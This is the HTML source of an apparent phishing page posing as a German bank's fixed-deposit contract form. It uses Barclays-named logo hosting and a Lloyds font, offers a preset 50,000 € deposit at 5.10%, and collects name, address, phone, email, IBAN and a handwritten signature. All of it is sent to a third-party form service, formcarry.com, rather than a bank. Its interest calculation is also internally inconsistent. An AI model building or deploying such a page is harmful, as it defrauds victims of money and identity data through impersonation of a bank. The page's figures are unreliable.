<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Festgeld Vertrag Formular - Mehrschritt</title>
<style>
  body {
    background-image: url('https://github.com/anlageprozess/anlageprozess/blob/main/bg.png?raw=true');
    background-repeat: no-repeat;
    background-size: cover;
    background-position: center center;
    background-attachment: fixed;
    margin: 0;
    min-height: 100vh;
    font-family: "Lloyds Bank Jack", system-ui, sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
      Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
    color: rgb(80, 80, 80);
  }
  .container {
    max-width: 700px;
    margin: 2rem auto;
    background: #fff;
    border-radius: 6px;
    padding: 3rem 2rem;
    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.12);
  }
  h1 {
    font-weight: 700;
    font-size: 1.7rem;
    margin-bottom: 2rem;
    color: #002f6c;
    letter-spacing: 0.02em;
    text-align: center;
  }
  form {
    display: block;
  }
  .step {
    display: none;
  }
  .step.active {
    display: block;
  }
  label {
    display: block;
    font-weight: 600;
    font-size: 1rem;
    margin-bottom: 0.5rem;
  }
  input[type="text"],
  input[type="email"],
  input[type="tel"],
  select,
  #zinssatz {
    background-color: #fff;
    border: 1px solid rgb(80, 80, 80);
    border-radius: 0;
    padding: 0.7rem 0.9rem;
    font-size: 1.125rem;
    width: 100%;
    box-sizing: border-box;
    margin-bottom: 1rem;
  }
  input[type="text"]:focus,
  input[type="email"]:focus,
  input[type="tel"]:focus,
  select:focus,
  #zinssatz:focus {
    border-color: #005ca5;
    outline: none;
    box-shadow: 0 0 6px rgba(0, 92, 165, 0.5);
  }
  .row {
    display: flex;
    gap: 1.5rem;
    flex-wrap: wrap;
    margin-bottom: 1rem;
  }
  .row > div {
    flex: 1 1 48%;
    min-width: 220px;
  }
  .checkbox-container {
    display: flex;
    align-items: flex-start;
    gap: 0.75rem;
    margin-bottom: 1rem;
  }
  .checkbox-container input[type="checkbox"],
  .checkbox-container input[type="radio"] {
    margin-top: 4px;
    width: 20px;
    height: 20px;
    border-radius: 0;
    border: 1.5px solid rgb(80, 80, 80);
    cursor: pointer;
    background: white;
  }
  .checkbox-container input[type="checkbox"]:focus,
  .checkbox-container input[type="radio"]:focus {
    outline: none;
    border-color: #005ca5;
    box-shadow: 0 0 6px rgba(0, 92, 165, 0.5);
  }
  .checkbox-container label {
    font-weight: 400;
    font-size: 1rem;
    color: rgb(80, 80, 80);
    line-height: 1.4;
  }
  .checkbox-container a {
    color: rgba(0, 92, 165, 0.5);
    text-decoration: none;
    font-weight: 600;
  }
  .checkbox-container a:hover,
  .checkbox-container a:focus {
    text-decoration: underline;
  }
  button {
    background-color: #005ca5;
    border: none;
    padding: 1.1rem 1.5rem;
    border-radius: 4px;
    font-weight: 700;
    font-size: 1.25rem;
    color: white;
    cursor: pointer;
    transition: background-color 0.25s ease;
    letter-spacing: 0.03em;
    margin-top: 1rem;
  }
  button:hover,
  button:focus {
    background-color: #003f7f;
    outline: none;
  }
  button[disabled] {
    background-color: #999;
    cursor: not-allowed;
  }
  #clear-signature {
    background-color: #ccc;
    color: #333;
    padding: 0.5rem 1rem;
    font-size: 1rem;
    margin-top: 0.5rem;
  }
  #clear-signature:hover,
  #clear-signature:focus {
    background-color: #bbb;
    outline: none;
  }
  /* Signature */
  #signature-pad {
    border: 1px solid rgb(80, 80, 80);
    border-radius: 4px;
    width: 100%;
    height: 150px;
    touch-action: none;
    margin-bottom: 0.5rem;
  }
  @media (max-width: 680px) {
    .row > div {
      flex: 1 1 100%;
    }
  }
</style>
</head>
<body>
  <main class="container" role="main" aria-label="Festgeld Vertrag Formular">
    <img src="https://github.com/Identifizierungsverfahren/barclays/blob/main/logoo.png?raw=true" alt="Logo" style="display: block; margin: 0 auto 25px; max-height: 120px;">
    <h1>Festgeld Vertrag Formular</h1>
    <form id="multiStepForm" action="https://formcarry.com/s/Q3rpBWAAXxV" method="POST" accept-charset="UTF-8" novalidate>
      <!-- Step 1 -->
      <section class="step active" aria-label="Persönliche Daten">
        <h2>Schritt 1: Persönliche Daten</h2>

        <!-- Personal Info -->
        <fieldset>
          <legend>Persönliche Informationen</legend>
          <div class="row">
            <div>
              <label for="vorname">Vorname *</label>
              <input type="text" id="vorname" name="vorname" required autocomplete="given-name" placeholder="Max" />
            </div>
            <div>
              <label for="nachname">Nachname *</label>
              <input type="text" id="nachname" name="nachname" required autocomplete="family-name" placeholder="Mustermann" />
            </div>
          </div>
          <div class="row">
            <div>
              <label for="telefon">Telefonnummer *</label>
              <input type="tel" id="telefon" name="telefon" required placeholder="+49 170 1234567" pattern="^\+?\d{7,15}$" />
            </div>
            <div>
              <label for="email">E-Mail Adresse *</label>
              <input type="email" id="email" name="email" required autocomplete="email" placeholder="max.mustermann@email.de" />
            </div>
          </div>
        </fieldset>

        <!-- Address -->
        <fieldset>
          <legend>Adresse</legend>
          <div class="row">
            <div>
              <label for="strasse">Straße *</label>
              <input type="text" id="strasse" name="strasse" required placeholder="Musterstraße 12" autocomplete="address-line1" />
            </div>
            <div>
              <label for="plz">PLZ *</label>
              <input type="text" id="plz" name="plz" required placeholder="12345" autocomplete="postal-code" />
            </div>
          </div>
          <div class="row">
            <div>
              <label for="ort">Ort *</label>
              <input type="text" id="ort" name="ort" required placeholder="Musterstadt" autocomplete="address-level2" />
            </div>
            <div>
              <label for="land">Land *</label>
              <input type="text" id="land" name="land" value="Deutschland" readonly aria-readonly="true" />
            </div>
          </div>
        </fieldset>

        <button type="button" id="nextBtn1" aria-label="Weiter zu Schritt 2">Weiter →</button>
      </section>

      <!-- Step 2 -->
      <section class="step" aria-label="Investitionsdetails">
        <h2>Schritt 2: Investitionsdetails</h2>

        <p><strong>Anlagebetrag:</strong> 50.000 €</p>
        <p><strong>Laufzeit:</strong> 12 Monate</p>
        <p><strong>Zinssatz (p.a.):</strong> 5,10 %</p>

        <p><strong>Berechnung des Zinsertrags:</strong></p>
        <p>
          Zinsertrag = Anlagebetrag × Zinssatz × (Laufzeit in Monaten / 12)<br />
          Zinsertrag = 50.000 × 0,0385 × (12 / 12) = <strong>2.550,00 €</strong>
        </p>

        <!-- Versteckte Inputs, damit die Werte gesendet werden -->
        <input type="hidden" name="anlagebetrag" value="50000" />
        <input type="hidden" name="laufzeit" value="12" />
        <input type="hidden" name="zinssatz" value="5.10" />
        <input type="hidden" name="zinsertrag" value="2550" />

        <!-- Banking Details -->
        <fieldset>
          <legend>Bankverbindung *</legend>
          <label for="iban">IBAN *</label>
          <input
            type="text"
            id="iban"
            name="iban"
            required
            pattern="[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}"
            placeholder="DE12500105170648489890"
            autocomplete="off"
            aria-describedby="ibanHelp"
          />
          <small id="ibanHelp">Bitte gib deine IBAN ohne Leerzeichen ein.</small>
        </fieldset>

        <button type="button" id="prevBtn2" aria-label="Zurück zu Schritt 1">← Zurück</button>
        <button type="button" id="nextBtn2" aria-label="Weiter zu Schritt 3">Weiter →</button>
      </section>

      <!-- Step 3 -->
      <section class="step" aria-label="Einwilligung und Unterschrift">
        <h2>Schritt 3: Einwilligung und Unterschrift</h2>

        <div class="checkbox-container">
          <input
            type="checkbox"
            id="einwilligung1"
            name="einwilligung1"
            required
          />
          <label for="einwilligung1">
            Ich stimme zu, dass meine Daten für die Bearbeitung dieses Vertrages verwendet werden.
          </label>
        </div>

        <div class="checkbox-container">
          <input
            type="checkbox"
            id="einwilligung2"
            name="einwilligung2"
            required
          />
          <label for="einwilligung2">
            Ich bestätige, dass ich die AGB gelesen und akzeptiert habe.
          </label>
        </div>

        <fieldset>
          <legend>Unterschrift *</legend>
          <canvas id="signature-pad" aria-label="Unterschriftenfeld" width="600" height="150"></canvas>
          <button type="button" id="clear-signature" aria-label="Unterschrift löschen">Unterschrift löschen</button>
          <input type="hidden" id="signature" name="signature" required />
        </fieldset>

        <button type="button" id="prevBtn3" aria-label="Zurück zu Schritt 2">← Zurück</button>
        <button type="submit" id="submitBtn" aria-label="Formular absenden">Absenden</button>
      </section>
    </form>
  </main>

  <script>
    // Mehrschritt Navigation
    const steps = document.querySelectorAll('.step');
    let currentStep = 0;

    const showStep = (index) => {
      steps.forEach((step, i) => {
        step.classList.toggle('active', i === index);
      });
    };

    document.getElementById('nextBtn1').addEventListener('click', () => {
      if (validateStep(steps[0])) {
        currentStep = 1;
        showStep(currentStep);
      }
    });

    document.getElementById('prevBtn2').addEventListener('click', () => {
      currentStep = 0;
      showStep(currentStep);
    });

    document.getElementById('nextBtn2').addEventListener('click', () => {
      if (validateStep(steps[1])) {
        currentStep = 2;
        showStep(currentStep);
      }
    });

    document.getElementById('prevBtn3').addEventListener('click', () => {
      currentStep = 1;
      showStep(currentStep);
    });

    // Formularvalidierung für jeden Schritt
    function validateStep(step) {
      const inputs = step.querySelectorAll('input, select, textarea');
      for (const input of inputs) {
        if (!input.checkValidity()) {
          input.reportValidity();
          return false;
        }
      }
      return true;
    }

    // Signature Pad
    const canvas = document.getElementById('signature-pad');
    const signatureInput = document.getElementById('signature');
    const clearBtn = document.getElementById('clear-signature');
    const ctx = canvas.getContext('2d');

    let drawing = false;

    canvas.addEventListener('pointerdown', (e) => {
      drawing = true;
      ctx.beginPath();
      ctx.moveTo(e.offsetX, e.offsetY);
    });

    canvas.addEventListener('pointermove', (e) => {
      if (!drawing) return;
      ctx.lineTo(e.offsetX, e.offsetY);
      ctx.strokeStyle = '#000';
      ctx.lineWidth = 2;
      ctx.lineCap = 'round';
      ctx.stroke();
    });

    canvas.addEventListener('pointerup', () => {
      drawing = false;
      updateSignatureInput();
    });

    canvas.addEventListener('pointerleave', () => {
      if (drawing) {
        drawing = false;
        updateSignatureInput();
      }
    });

    clearBtn.addEventListener('click', () => {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      signatureInput.value = '';
    });

    function updateSignatureInput() {
      signatureInput.value = canvas.toDataURL();
    }

    // Abschicken verhindern, wenn keine Unterschrift
    document.getElementById('multiStepForm').addEventListener('submit', (e) => {
      if (!signatureInput.value) {
        e.preventDefault();
        alert('Bitte unterschreiben Sie im Unterschriftenfeld.');
        return false;
      }
    });
  </script>
</body>
</html>
